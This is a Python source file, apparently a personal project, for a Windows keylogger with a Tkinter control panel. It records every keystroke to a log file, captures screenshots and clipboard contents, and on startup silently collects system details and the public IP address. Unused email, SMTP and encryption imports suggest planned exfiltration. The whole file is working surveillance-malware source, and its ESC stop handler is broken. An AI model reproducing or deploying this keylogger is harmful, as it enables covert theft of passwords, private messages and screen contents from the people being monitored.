# Libraries
from datetime import datetime
from email.mime import image
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import threading
from logging import root

import resample
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab, ImageTk, Image
from tkinter.ttk import  Progressbar
from tkinter import Tk, Button, Label, Text, Toplevel, PhotoImage
from collections import Counter


# Handle compatibility across Pillow versions
try:
    resample = Image.Resampling.LANCZOS  # Pillow >= 9.1
except AttributeError:
    resample = Image.LANCZOS  # Older versions

keys_information = "key_log.txt"
system_information = "system_log.txt"
screenshot_information = "screenshot.png"
clipboard_information = "clipboard.txt"

file_path = 'C:\\Users\patrj\PycharmProjects\PythonProject\Project'
extend = "\\"

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Could not get public IP address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + (platform.system()) + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


count = 0
keys = []

keystroke_count = 0 # Tracks total keystrokes logged
keystroke_limit = 1000 # Customize the maximum for the progress bar


def on_press(key):
        global keys, count, keystroke_count, keystroke_limit

        print(key)
        keys.append(key)
        count += 1
        keystroke_count += 1 # Increment the global keystroke count

        keystroke_label.config(text=f"Keystrokes: {keystroke_count}")  # Update GUI label
        progress_bar["value"] = (keystroke_count / keystroke_limit) * 100  # Update progress bar


        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

def write_file(keys):
    try:
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "space" in k:
                    f.write('\n')
                elif "Key" not in k:
                    f.write(k)
    except Exception as e:
        print(f"Error writing keys to file: {e}")


def on_release(key):
    global keys
    # Write any remaining keys to the file when the listener stops
    def on_release(key):
        if key == Listener.Key.esc:  # Use ESC to stop the listener
            return False



def create_gui():
    global keystroke_label, progress_bar  # Declare GUI elements globally for dynamic updates
    root = Tk()
    root.title("Keylogger Interface")
    root.geometry("600x400")
    root.configure(bg="#282c34")

    Label(root, text="Keylogger Control Panel", font=("Helvetica", 16), fg="#f39c12", bg="#282c34").pack(pady=10)

    # Add keystroke counter label
    keystroke_label = Label(root, text="Keystrokes: 0", font=("Helvetica", 14), fg="#98c379", bg="#282c34")
    keystroke_label.pack(pady=10)

    # Add progress bar for keystrokes
    progress_bar = Progressbar(root, orient="horizontal", length=300, mode="determinate")
    progress_bar.pack(pady=10)

    feedback_label = Label(root, text="", font=("Helvetica", 12), fg="#98c379", bg="#282c34")
    feedback_label.pack(pady=10)

    # View System Information
    def view_system_info():
        top = Toplevel(root)
        top.title("System Information")
        top.geometry("400x300")
        top.configure(bg="#282c34")
        text_area = Text(top, bg="#1c1c1c", fg="white", font=("Helvetica", 12))
        text_area.pack(expand=True, fill="both")

        # Read the system information file
        try:
            with open(file_path + extend + system_information, "r") as f:
                text_area.insert("1.0", f.read())
        except FileNotFoundError:
            text_area.insert("1.0", "System Information file not found.")

    Button(root, text="View System Info", command=view_system_info, font=("Helvetica", 12), fg="#282c34", bg="#61dafb").pack(pady=5)

    # View Screenshot
    def view_screenshot():


        screenshot_folder =  "C:/Users/patrj/PycharmProjects/PythonProject/Project/Key-log-SS"

        if not os.path.exists(screenshot_folder):
            os.makedirs(screenshot_folder)


        top = Toplevel()
        top.title("Screenshot Viewer")
        top.geometry("600x400")
        top.configure(bg="#282c34")


        try:
            # Capture the screenshot directly using ImageGrab
            screenshot_image = ImageGrab.grab()
            timestamp = datetime.now().strftime("%d%m%Y_%H%M%S")
            screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}0.png")
            screenshot_image.save(screenshot_path)
            screenshot_image.save("screenshot.png")  # Save dynamically captured screenshot
            screenshot_image = screenshot_image.resize((500, 300), resample)  # Resize for better display
            screenshot_tk = ImageTk.PhotoImage(screenshot_image)  # Convert to Tkinter-compatible format
            Label(top, image=screenshot_tk, bg="#282c34").pack()


            # Keep a reference to prevent garbage collection
            top.image = screenshot_tk
            Label(top , text=f"Screenshot saved at:  {screenshot_path}", font=("Helvetica", 8), fg="#282c34").pack()
        except Exception as e:
            # Handle unexpected errors
            Label(top, text=f"Error: {e}", font=("Helvetica", 12), fg="#ff6666", bg="#282c34").pack()


    Button(root, text="View Screenshot", command=view_screenshot, font=("Helvetica", 12), fg="#282c34", bg="#61dafb").pack(pady=5)

    def copy_clipboard():
        top = Toplevel(root)
        top.title("Clipboard Data")
        top.geometry("400x300")
        top.configure(bg="#282c34")

        text_area = Text(top, bg="#1c1c1c", fg="white", font=("Helvetica", 12))
        text_area.pack(expand=True, fill="both")

        try:
            win32clipboard.OpenClipboard()

            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT).decode("utf-8")
            else:
                clipboard_data = "Clipboard is empty or contains unsupported format."

            win32clipboard.CloseClipboard()

            text_area.insert("1.0", clipboard_data)  # Insert clipboard data into the text area
        except Exception as e:
            text_area.insert("1.0", f"Error accessing clipboard: {e}")

    # Ensure the button for clipboard functionality is properly added
    Button(root, text="View Clipboard Data", command=copy_clipboard, font=("Helvetica", 12), fg="#282c34", bg="#61dafb").pack(pady=5)

    # Start Keylogger
    def start_keylogger():


        # Provide feedback to the user
        feedback_label.config(text="Keylogger has started!")
        def keylogger_thread():
            feedback_label.config(text="Keylogger has started.")
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

        # Start the keylogger in a new thread
        thread = threading.Thread(target=keylogger_thread, daemon=True)
        thread.start()

    Button(root, text="Start Keylogger", command=start_keylogger, font=("Helvetica", 12), fg="#282c34", bg="#61dafb").pack(pady=5)

    # Exit Program
    Button(root, text="Exit", command=root.destroy, font=("Helvetica", 12), fg="#282c34", bg="#61dafb").pack(pady=5)

    from tkinter import PhotoImage

    # Placeholder image (replace with your actual image later)
    placeholder = PhotoImage(width=100, height=50)


    root.mainloop()

create_gui()


with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()




